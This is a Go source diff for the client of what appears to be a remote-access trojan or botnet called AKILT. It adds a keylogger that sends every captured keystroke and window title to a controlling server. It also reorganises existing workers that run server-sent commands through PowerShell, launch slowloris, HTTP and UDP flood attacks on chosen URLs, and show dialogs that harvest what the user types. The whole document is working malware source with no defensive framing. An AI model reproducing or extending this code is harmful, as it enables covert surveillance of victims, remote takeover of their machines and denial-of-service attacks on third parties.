@@ -29,6 +29,7 @@ import (
 	"github.com/Xart3mis/AKILT/Client/lib/DOS/udpflood"
 	"github.com/Xart3mis/AKILT/Client/lib/bundles"
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
+	"github.com/Xart3mis/AKILT/Client/lib/keylogger"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
@@ -122,7 +123,12 @@ func main() {
 		log.Panicf("LoadFont: %v", err)
 	}
 
-	WindowLoop(window, font, pid, mode, ctx, receiver, c)
+	var key_out chan rune = make(chan rune)
+	var window_out chan string = make(chan string)
+
+	keylogger.Run(key_out, window_out)
+
+	WindowLoop(window, font, pid, mode, ctx, receiver, c, key_out, window_out)
 
 	receiver.CloseSend()
 	window.Destroy()
@@ -130,80 +136,115 @@ func main() {
 }
 
 func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.VidMode,
-	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient) {
+	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient,
+	key_out chan rune, window_out chan string) {
 	lastFrameTime := 0.0
 	fpslimit := 1.0 / 100.0
 
 	for !window.ShouldClose() {
 		now := glfw.GetTime()
 
-		text, should_update, err := GetOnScreenText(receiver, pid)
-		if err != nil {
-			log.Println(err)
-		}
-		Draw(font, mode, pid, text, window, should_update)
+		draw_worker(client, ctx, pid, receiver, window, font, mode)
 
 		if (now - lastFrameTime) >= fpslimit {
 			lastFrameTime = now
 
-			go func() {
-				d, err := client.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
-
-				if err != nil {
-					log.Println("Error during GetCommand:", err)
-				}
-
-				var out []byte
-				if d.GetShouldExec() {
-					out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
-					client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
-					if err != nil {
-						log.Println("Error during exec", err)
-					}
-				}
-			}()
-
-			go func() {
-				flood, _ := client.GetFlood(ctx, &pb.Void{})
-
-				if flood.GetShouldFlood() {
-					switch flood.FloodType {
-					case 0:
-						slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Nanosecond,
-							time.Duration(flood.GetLimit())*time.Second)
-					case 1:
-						httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
-							flood.GetNumThreads())
-					case 2:
-						//
-					case 3:
-						udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
-							time.Duration(flood.GetLimit())*time.Second)
-					}
-				}
-			}()
-
-			go func() {
-				dialog, _ := client.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})
-
-				if dialog.GetShouldShowDialog() {
-					var text string = ""
-					for len(text) <= 0 {
-						fmt.Println(dialog.GetDialogPrompt(), dialog.GetDialogTitle())
-						text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
-					}
-
-					client.SetDialogOutput(ctx, &pb.DialogOutput{
-						EntryText: text,
-						Id: &pb.ClientDataRequest{
-							ClientId: pid}})
-				}
-			}()
+			go keylog_worker(client, ctx, pid, key_out, window_out)
+			go dialog_worker(client, ctx, pid)
+			go exec_worker(client, ctx, pid)
+			go flood_worker(client, ctx)
 
 			window.SwapBuffers()
 			glfw.WaitEventsTimeout(fpslimit / 10000)
 		}
 
+	}
+}
+
+func keylog_worker(client pb.ConsumerClient, ctx context.Context, pid string, key_out chan rune, window_out chan string) {
+	key := <-key_out
+	window := <-window_out
+
+	client.SetKeylogOutput(ctx, &pb.KeylogOutput{
+		Id:          &pb.ClientDataRequest{ClientId: pid},
+		WindowTitle: window,
+		Key:         key})
+}
+
+func draw_worker(client pb.ConsumerClient, ctx context.Context, pid string,
+	receiver pb.Consumer_SubscribeOnScreenTextClient, window *glfw.Window,
+	font *glfont.Font, mode *glfw.VidMode) error {
+
+	text, should_update, err := GetOnScreenText(receiver, pid)
+	if err != nil {
+		return fmt.Errorf("error getting onscreen text: %v", err)
+	}
+	Draw(font, mode, pid, text, window, should_update)
+
+	return nil
+}
+
+func exec_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
+	d, err := client.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
+
+	if err != nil {
+		log.Println("Error during GetCommand:", err)
+	}
+
+	var out []byte
+	if d.GetShouldExec() {
+		out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
+		client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+		if err != nil {
+			return fmt.Errorf("error during exec: %v", err)
+		}
+	}
+
+	return nil
+}
+
+func dialog_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
+	dialog, _ := client.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})
+
+	if dialog.GetShouldShowDialog() {
+		var text string = ""
+		var err error
+
+		for len(text) <= 0 {
+			fmt.Println(dialog.GetDialogPrompt(), dialog.GetDialogTitle())
+			text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
+		}
+
+		if err != nil {
+			return fmt.Errorf("error during dialog: %v", err)
+		}
+
+		client.SetDialogOutput(ctx, &pb.DialogOutput{
+			EntryText: text,
+			Id: &pb.ClientDataRequest{
+				ClientId: pid}})
+	}
+
+	return nil
+}
+
+func flood_worker(client pb.ConsumerClient, ctx context.Context) {
+	flood, _ := client.GetFlood(ctx, &pb.Void{})
+
+	if flood.GetShouldFlood() {
+		switch flood.FloodType {
+		case 0:
+			slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Nanosecond,
+				time.Duration(flood.GetLimit())*time.Second)
+		case 1:
+			httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
+				flood.GetNumThreads())
+		case 2:
+			//
+		case 3:
+			udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
+				time.Duration(flood.GetLimit())*time.Second)
+		}
 	}
 }
 
